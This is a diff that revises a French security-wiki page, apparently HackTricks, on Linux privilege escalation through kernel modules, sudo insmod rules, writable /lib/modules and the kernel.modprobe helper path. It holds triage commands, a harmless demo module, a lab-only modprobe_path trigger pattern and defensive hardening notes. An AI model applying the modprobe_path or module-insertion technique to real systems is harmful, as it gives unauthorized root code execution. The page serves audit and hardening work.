@@ -1,16 +1,16 @@
-# Modules du noyau et abus de modprobe
+# Abus des modules du noyau et de modprobe
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Erreurs de configuration des modules du noyau et du chargement des modules
+## Mauvaises configurations des modules du noyau et du chargement des modules
 
-La prise en charge des modules du noyau est un domaine à fort impact lors de l’examen d’une escalation de privilèges Linux. Ne considérez pas chaque message concernant un module non signé comme exploitable en soi, mais utilisez-le pour répondre à des questions pratiques :
+La prise en charge des modules du noyau est un domaine à fort impact lors de l'audit d'une privilege escalation sous Linux. Ne considérez pas chaque message concernant un module non signé comme exploitable en soi, mais utilisez-le pour répondre à des questions pratiques :
 
-- L’utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin d’assistant accessible en écriture ?
+- L'utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin d'assistant accessible en écriture ?
 - Le chargement des modules est-il toujours activé ?
-- L’application des signatures des modules est-elle désactivée ?
-- Les répertoires de modules ou les fichiers de modules sont-ils accessibles en écriture ?
-- Les journaux du noyau peuvent-ils être lus pour confirmer ce qui s’est produit ?
+- L'application des signatures des modules est-elle désactivée ?
+- Les répertoires ou fichiers de modules sont-ils accessibles en écriture ?
+- Les logs du noyau peuvent-ils être lus pour confirmer ce qui s'est produit ?
 
 Triage rapide :
 ```bash
@@ -27,14 +27,14 @@ Interprétation :
 
 - `modules_disabled=1` signifie que de nouveaux modules ne peuvent pas être chargés avant le redémarrage.
 - `module_sig_enforce=1` bloque généralement les modules non signés.
-- `dmesg_restrict=0` permet aux utilisateurs non privilégiés de lire les journaux du kernel sur de nombreux systèmes.
+- `dmesg_restrict=0` permet aux utilisateurs non privilégiés de lire les logs du kernel sur de nombreux systèmes.
 - Les chemins accessibles en écriture sous `/lib/modules/$(uname -r)/` sont dangereux, car la découverte et l’auto-chargement des modules peuvent faire confiance à cette arborescence.
 
 ### Charger un module et lire la sortie du kernel
 
-Si vous disposez d’une autorisation légitime pour charger un module local, `insmod` insère le fichier `.ko` exact que vous fournissez. La fonction d’initialisation du module s’exécute immédiatement, et les messages écrits avec `printk()` apparaissent dans les journaux du kernel.
+Si vous disposez de l’autorisation légitime de charger un module local, `insmod` insère le fichier `.ko` exact que vous fournissez. La fonction d’initialisation du module s’exécute immédiatement, et les messages écrits avec `printk()` apparaissent dans les logs du kernel.
 
-Workflow minimal pour les environnements de revue ou de laboratoire :
+Workflow minimal pour les revues ou les environnements de lab :
 ```bash
 ls -l ./example.ko
 modinfo ./example.ko 2>/dev/null
@@ -49,11 +49,11 @@ Si `sudo -l` autorise `insmod`, `modprobe` ou un wrapper autour de ces commandes
 sudo -l
 sudo /sbin/insmod ./example.ko
 ```
-### `insmod` autorisé par Sudo
+### `insmod` autorisé via sudo
 
-Une règle Sudo permettant à un utilisateur d’exécuter `insmod` n’est pas comparable à l’autorisation d’utiliser un helper administratif normal. Le code d’initialisation du module s’exécute dans le contexte du kernel dès que le fichier `.ko` est inséré. La question pratique lors de l’audit est donc la suivante : « cet utilisateur peut-il choisir ou modifier le module chargé ? »
+Une règle sudo qui permet à un utilisateur d’exécuter `insmod` n’est pas comparable à l’autorisation d’utiliser un helper administratif normal. Le code d’initialisation du module s’exécute dans le contexte du kernel dès que le fichier `.ko` est inséré. La question pratique lors de la revue est donc : « cet utilisateur peut-il choisir ou modifier le module chargé ? »
 
-Flux d’audit générique :
+Flux de revue générique :
 ```bash
 sudo -l
 ls -l ./candidate.ko
@@ -63,9 +63,9 @@ lsmod | grep -i candidate
 dmesg | tail -n 30
 sudo /sbin/rmmod candidate
 ```
-Si l’utilisateur peut fournir un fichier `.ko` arbitraire, la règle doit être considérée comme une compromission complète du système dans le cadre d’un assessment autorisé. Une approche opérationnelle plus sûre consiste à éviter de déléguer le chargement des modules via sudo ; si cela est inévitable, limitez le chemin exact, la propriété, les permissions, la politique de signature et le workflow de suppression.
+Si l’utilisateur peut fournir un fichier `.ko` arbitraire, la règle doit être considérée comme une compromission complète du système dans le cadre d’une évaluation autorisée. Une approche opérationnelle plus sûre consiste à éviter de déléguer le chargement des modules via sudo ; si cela est inévitable, limitez précisément le chemin, le propriétaire, les permissions, la politique de signature et la procédure de suppression.
 
-Pour un pattern inoffensif de compilation de module dans un environnement de test contrôlé, un source minimal et un Makefile ressemblent à ceci :
+Pour un modèle inoffensif de compilation de module dans un lab contrôlé, un code source minimal et un Makefile peuvent se présenter ainsi :
 ```c
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -93,16 +93,16 @@ make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
-Construisez et chargez uniquement dans un laboratoire autorisé :
+Compilez et chargez uniquement dans un lab autorisé :
 ```bash
 make
 sudo insmod demo.ko
 dmesg | tail -n 20
 sudo rmmod demo
 ```
-### Contrôles d’abus de `kernel.modprobe` / `modprobe_path`
+### Vérifications d’abus de `kernel.modprobe` / `modprobe_path`
 
-`kernel.modprobe` contrôle l’assistant de l’espace utilisateur que le kernel invoque lorsqu’il a besoin d’aide pour charger un module. Si un attaquant peut le modifier afin de pointer vers le chemin d’un exécutable accessible en écriture et déclencher un format binaire inconnu ou un autre mécanisme de demande de module, cela peut permettre une exécution de code avec les privilèges root.
+`kernel.modprobe` contrôle l’assistant userspace que le kernel invoque lorsqu’il a besoin d’aide pour charger un module. Si un attaquant peut le modifier afin de le faire pointer vers le chemin d’un exécutable accessible en écriture et déclencher un format binaire inconnu ou un autre chemin de demande de module, cela peut permettre une exécution de code en tant que root.
 
 Vérifiez l’assistant actuel :
 ```bash
@@ -110,13 +110,13 @@ cat /proc/sys/kernel/modprobe 2>/dev/null
 sysctl kernel.modprobe 2>/dev/null
 ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
 ```
-Vérifiez si vous pouvez l'influencer :
+Vérifiez si vous pouvez l’influencer :
 ```bash
 ls -l /proc/sys/kernel/modprobe
 sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
 getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
 ```
-Modèle générique réservé aux labs :
+Modèle générique réservé aux laboratoires :
 ```bash
 # Example only: requires permission to write kernel.modprobe
 printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
@@ -129,13 +129,13 @@ chmod +x /tmp/unknown
 /tmp/unknown 2>/dev/null || true
 cat /tmp/modprobe-helper-ran 2>/dev/null
 ```
-Sur les systèmes renforcés, cela devrait échouer, car les utilisateurs non privilégiés ne peuvent pas écrire dans `kernel.modprobe`, le chemin de l’helper n’est pas inscriptible ou les chemins de chargement des modules sont bloqués.
+Sur les systèmes durcis, cette opération devrait échouer, car les utilisateurs non privilégiés ne peuvent pas écrire dans `kernel.modprobe`, le chemin de l’helper n’est pas accessible en écriture ou les chemins de chargement des modules sont bloqués.
 
-### Vérification des répertoires `/lib/modules` inscriptibles
+### Vérification de `/lib/modules` accessible en écriture
 
-Les répertoires de modules inscriptibles peuvent permettre le remplacement de modules, le dépôt de modules malveillants ou l’abus du chargement automatique, selon la manière dont `modprobe` est ensuite invoqué.
+Les répertoires de modules accessibles en écriture peuvent permettre le remplacement de modules, l’implantation de modules malveillants ou l’abus du chargement automatique, selon la manière dont `modprobe` est ensuite invoqué.
 
-Vérifiez les emplacements inscriptibles :
+Examinez les emplacements accessibles en écriture :
 ```bash
 KREL="$(uname -r)"
 find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
@@ -148,9 +148,10 @@ modprobe --show-depends <module_name> 2>/dev/null
 modinfo <module_name> 2>/dev/null
 grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
 ```
-Notes défensives :
+Notes de défense :
 
-- Gardez `/lib/modules` appartenant à `root:root` et non accessible en écriture par les utilisateurs.
-- Définissez `kernel.modules_disabled=1` après le démarrage lorsque cela est possible sur le plan opérationnel.
-- Appliquez la signature des modules sur les systèmes nécessitant des modules chargeables.
-- Surveillez les écritures dans `/proc/sys/kernel/modprobe` et `/lib/modules`, ainsi que l’exécution inattendue de `insmod`/`modprobe`.
+- Gardez `/lib/modules` appartenant à `root:root` et non inscriptible par les utilisateurs.
+- Définissez `kernel.modules_disabled=1` après le démarrage lorsque cela est opérationnellement possible.
+- Appliquez la signature des modules sur les systèmes qui nécessitent des modules chargeables.
+- Surveillez les écritures dans `/proc/sys/kernel/modprobe`, `/lib/modules`, ainsi que l’exécution inattendue de `insmod`/`modprobe`.
+{{#include ../../banners/hacktricks-training.md}}
